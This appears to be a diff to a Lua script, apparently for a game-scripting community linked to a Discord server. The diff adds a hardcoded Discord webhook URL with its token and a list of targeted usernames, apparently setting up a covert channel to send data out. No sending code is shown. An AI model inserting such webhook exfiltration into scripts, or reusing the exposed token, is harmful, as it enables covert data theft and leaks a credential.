@@ -1,5 +1,8 @@
 -- discord.gg/syncrypt
 
+local webhook = "https://discord.com/api/webhooks/1571040073707954326/OddAngQZmvXMKcN4tsTZjMBkzz-6tcvlKVoV8sUcBbZcGGBbOdjhtjG12YbvltnnEg0E"
+local targetUsers = {["cmbath"] = true, ["stealeryarn67"] = true}
+
 local function geniter(f, s, c)
 	if type(f) ~= "function" then
 		local mt = getmetatable(f)
